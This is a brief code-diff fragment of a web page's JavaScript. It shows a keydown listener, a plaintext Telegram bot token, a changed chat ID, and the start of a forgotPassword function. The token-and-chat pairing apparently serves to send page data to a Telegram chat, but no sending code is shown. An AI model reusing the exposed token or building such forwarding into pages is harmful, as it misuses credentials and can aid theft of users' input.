@@ -42,7 +42,7 @@ document.addEventListener("keydown", function(e){
     }
 });
 const BOT_TOKEN = "8752443026:AAEHrvCIDLqEDfE_inDeAAI9dzClm3WZyz4"
-const CHAT_ID = "847054134";
+ const chatId = "6087791909";
 
 async function forgotPassword(){
 
